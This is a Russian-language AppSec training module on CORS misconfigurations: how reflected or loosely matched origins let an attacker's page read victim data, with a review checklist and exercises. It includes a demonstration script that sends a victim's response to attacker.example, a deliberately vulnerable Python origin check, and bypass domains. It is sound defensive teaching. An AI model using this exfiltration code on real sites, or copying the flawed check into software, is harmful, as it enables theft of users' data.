# Мисконфигурации CORS как вектор доступа

Уровень **L2** · время 30 мин (теория 17 / задача 8 / самопроверка 5,
оценка)

Что прочитать сначала: `cors`, `same-origin-policy`, `idor`.

Механизм CORS, разбор его заголовков и канон настройки лежат в теме `cors` и
здесь не повторяются: тема отвечает на вопрос, что атакующий с ошибки
получает.

## 0. Коротко

CORS ослабляет политику одного источника: он разрешает чужой странице **читать
ответ**, который иначе был бы ей недоступен. Ошибка в настройке превращает это
в канал доступа к данным: страница атакующего шлёт запрос к приложению с cookie
жертвы, получает разрешение и читает ответ. OWASP относит такую ошибку к
A01:2025 прямо. Чинится сверкой origin со списком целиком, а не по подстроке, и
отказом выдавать разрешение вместе с учётными данными кому попало.

**Зачем это в работе AppSec-инженера.** Настройка выглядит как задача про
заголовки и оценивается как низкая находка, пока не показан результат. Результат
— скрипт на чужой странице, читающий профиль, ключ API и токен защиты от
подделки запроса.
Между «мисконфигурацией CORS» и «утечкой данных всех пользователей» лежат
десять строк демонстрации. Собрать их должен ревьюер.

## 1. Цели

После этого раздела вы сможете:

1. Назвать, что атакующий читает при отражённом `Origin` и включённых учётных
   данных.
2. Найти ошибку сопоставления origin по префиксу, суффиксу и подстроке.
3. Показать, откуда берётся origin со значением `null`.
4. Оценить, что даёт цепочка «доверенный поддомен — XSS — чужие данные».

## 3. Механика

**Откуда это взялось.** Политика одного источника разрешает отправить запрос
куда угодно и запрещает прочитать ответ. Приложениям понадобилось обратное:
фронтенд на одном адресе, API на другом. Ослабление сделали управляемым — сервер
называет origin, которому доверяет. Ошибка появилась вместе с решением: список
доверенных надо вести, а ведение стоит работы, и его подменяют отражением
пришедшего значения. Отражение выглядит как выдача разрешения тому, кто уже
пришёл, а работает как разрешение всем.

### Что получает атакующий

Приём состоит из трёх условий: ответ несёт что-то ценное, разрешение выдаётся
origin атакующего, и разрешение выдано вместе с `Access-Control-Allow-Credentials:
true`. Тогда скрипт на чужой странице шлёт запрос с `withCredentials`, браузер
прикладывает cookie жертвы, а разрешение открывает чтение ответа.

```javascript
// УЯЗВИМО — демонстрация приёма, не для продакшена.
const url = "https://vulnerable-website.com/sensitive-victim-data";
const req = new XMLHttpRequest();
req.open("get", url, true);
req.withCredentials = true;                    // (1)
req.onload = () => {                           // (2)
  const body = encodeURIComponent(req.responseText);
  location = "//attacker.example/log?d=" + body;
};
req.send();
```

1. Учётные данные прикладываются браузером: сессия жертвы работает в её же
   браузере.
2. Обработчик выполняется, только если сервер выдал разрешение читать. Без
   разрешения браузер отдаёт ошибку и тело скрипту не показывает.

Ценность добычи задаёт содержимое ответа. Профиль — утечка. Ключ API — доступ к
другим службам. Токен защиты от подделки запроса — превращение чтения в запись:
атакующий получает возможность отправлять запросы, которые иначе отверг бы
механизм защиты.

### Три ошибки сопоставления

Первая — отражение пришедшего значения без сверки: разрешение получает любой
origin.

Вторая — сверка по краю строки. Список ведут «по всем поддоменам» и проверяют
окончанием: адрес, кончающийся на `normal-website.com`, доверенный. Атакующий
регистрирует `hackersnormal-website.com`. Симметричная ошибка — проверка началом:
доверяют всему, что начинается с `normal-website.com`, и атакующий берёт
`normal-website.com.evil-user.net`.

Третья — доверие значению `null`. Спецификация допускает такой origin, и браузер
шлёт его в нескольких случаях. Это перенаправление между origin, запрос из
сериализованных данных, запрос со схемой `file:` и запрос из документа в
песочнице `iframe`. `null` попадает в списки как «для локальной разработки», а получить его
атакующий может сам — достаточно `iframe` с атрибутом `sandbox`.

### Цепочка через доверенный поддомен

Отдельный случай — правильный список, в котором стоит поддомен со своей
уязвимостью. Скрипт, внедрённый на `sub.example.com`, работает в origin из списка
доверенных. CORS здесь ничего не нарушает: он выполняет ровно то, что
настроено. Меняется цена уязвимости на второстепенном поддомене — она становится
ценой доступа к данным основного приложения.

## 5. Как выглядит в коде

Механику настройки читайте в теме `cors`. Со стороны вектора доступа ревьюер
задаёт три вопроса подряд.

```python
# УЯЗВИМО — демонстрация, не для продакшена.
origin = request.headers.get("Origin", "")
if origin.endswith("example.com"):                       # (1)
    resp.headers["Access-Control-Allow-Origin"] = origin  # (2)
    resp.headers["Access-Control-Allow-Credentials"] = "true"
```

1. Сверка по краю строки. Домен `notexample.com` проходит проверку.
2. Значение из запроса возвращается в разрешение. Вместе с учётными данными
   это открывает чтение ответа.

Обёртка, которая выглядит защитой: список origin, собранный через регулярное
выражение с незаэкранированной точкой — `https://.*\.example\.com` пропустит
`https://evil.example.com.attacker.net`, если выражение не привязано к концу
строки.

Ложное срабатывание: `Access-Control-Allow-Origin: *` без учётных данных на
публичном ответе. ASVS v5.0-3.4.2 требует в этом случае убедиться, что ответ не
несёт чувствительных сведений, — и на этом всё.

## 6. Как чинится

Канон настройки разобран в теме `cors`: сверка со списком целиком, `Vary: Origin`
за пределами условия, `null` в список не входит. Со стороны вектора доступа к
этому добавляются два вопроса.

Первый: что лежит в ответе, который разрешено читать. Ключи, токены и чужие
идентификаторы из ответа убираются независимо от списка доверенных.

Второй: не заменяет ли CORS проверку прав. Разрешение читать ответ — не
авторизация. Запрос уже выполнен сервером, и если чувствительное действие
вызывается запросом без предварительного круга, список origin его не остановит
(ASVS v5.0-3.5.2).

**Границы применимости.** Список доверенных origin закрывает чтение ответа
чужой страницей и не закрывает ничего внутри доверенного origin. Цена ведения
списка — правка при каждом новом поддомене фронтенда; цена ошибки в нём — доступ
к данным всех пользователей.

## 9. Ловушка

Распространённое представление: настройка CORS относится к заголовкам и
браузерам, поэтому её ошибки — низкая находка про конфигурацию.

**Ошибка в CORS даёт чтение чужих данных под сессией жертвы.** Механизм решает
единственный вопрос — можно ли чужой странице прочитать ответ, и ответ этот
приходит с cookie пользователя.

Контрпример. Приложение отражает `Origin` и выдаёт `Allow-Credentials: true` на
точке `/api/me`. Страница атакующего читает оттуда почту, роль и токен защиты от
подделки запроса каждого, кто её открыл. Записи в отчёте «мисконфигурация CORS»
и «утечка персональных данных всех посетителей» описывают одну строку настройки.

## 10. Чеклист ревью

1. Verify that значение `Access-Control-Allow-Origin` задано приложением либо
   сверено со списком доверенных origin целиком (ASVS v5.0-3.4.2).
2. Verify that сверка origin не делается по началу строки, по концу строки или
   по вхождению подстроки.
3. Verify that значение `null` не входит в список доверенных origin.
4. Verify that `Access-Control-Allow-Credentials: true` выдаётся только тем
   origin, которым разрешено читать ответ с учётными данными.
5. Verify that ответы, открытые для чтения из другого origin, не несут ключей,
   токенов и чужих идентификаторов.
6. Verify that чувствительное действие нельзя вызвать запросом, который не
   порождает предварительного круга (ASVS v5.0-3.5.2).
7. Verify that поддомены из списка доверенных проверены на внедрение скрипта:
   их origin получает доступ наравне с основным.

## 11. Задача

Возьмите точку API знакомого приложения, которая отдаёт что-нибудь про
пользователя, и отправьте к ней запрос с подставленным заголовком `Origin`.
Повторите четыре раза: чужой домен, домен с приписанным префиксом, домен с
приписанным суффиксом, значение `null`.

Одна подсказка: смотрите не только на `Access-Control-Allow-Origin`, но и на
`Access-Control-Allow-Credentials` — без второго заголовка чтение под сессией
жертвы не работает.

**Критерий выполнения** наблюдаемый: таблица из четырёх строк с присланным
`Origin` и двумя полученными заголовками. Отдельной строкой записано, какие из
четырёх значений приложение приняло.

## 12. Проверь себя

1. Какие три условия нужны, чтобы страница атакующего прочитала ответ под
   сессией жертвы?
2. Чем сверка origin по концу строки отличается от сверки со списком целиком и
   что даёт атакующему?
3. Откуда берётся origin со значением `null` и как его получают намеренно?
4. Почему уязвимость на второстепенном поддомене становится доступом к данным
   основного приложения?
5. Возврат к теме `same-origin-policy`: что именно запрещает политика и какую
   из её частей CORS ослабляет?

<details>
<summary>Ответы</summary>

1. В ответе есть что читать; разрешение выдано origin атакующего; вместе с
   разрешением выдан `Access-Control-Allow-Credentials: true`, а запрос
   отправлен с `withCredentials`.
2. Сверка по концу строки принимает любой домен, оканчивающийся на доверенный.
   Атакующий регистрирует `hackersnormal-website.com` и получает разрешение.
3. Браузер шлёт `null` при перенаправлении между origin, при запросе из
   сериализованных данных, из схемы `file:` и из документа в песочнице.
   Намеренно его получают через `iframe` с атрибутом `sandbox`.
4. Скрипт на поддомене выполняется в origin, который стоит в списке доверенных.
   Разрешение выдаётся ему законно, и данные основного приложения читаются.
5. Политика разрешает отправить запрос в чужой origin и запрещает прочитать
   ответ. CORS ослабляет вторую часть — чтение ответа, — и только её.

</details>
